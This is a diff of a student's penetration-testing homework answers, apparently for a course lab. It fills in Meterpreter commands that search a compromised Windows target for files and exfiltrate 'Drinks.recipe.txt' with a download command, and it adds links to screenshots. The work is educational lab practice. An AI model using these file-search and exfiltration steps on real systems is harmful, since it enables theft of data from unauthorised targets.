@@ -121,17 +121,21 @@ Answer: `search -f *secretfile*.txt`
 
 This command will place a wildcard in front of and behind 'secretfile' in 'secretfile.txt', meaning the search will look for anything that contains 'secretfile.txt' as well as any other text files that have anything before or after 'secretfile.txt'.
 
+![search secretfile](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/search%20secret.PNG)
+
 **You should now have a Meterpreter session open.**
 
 **Run the command to performs a search for the recipe.txt on the target:**
 
 Answer: `search -f *recipe*.txt`
 
-**Bonus: Run the command that exfiltrates the recipe*.txt file:**
+![search recipe](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/search%20recipe.PNG)
 
-**Bonus: Run the command that exfiltrates the recipe*.txt file:**
+**Bonus: Run the command that exfiltrates the recipe.txt file:**
 
-Answer:
+Answer: `download 'c:\Users\IEUser\Documents\Drinks.recipe.txt'`
+
+![Download recipe](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/download%20Drinks.recipe.png)
 
 **You can also use Meterpreter's local exploit suggester to find possible exploits.**
 
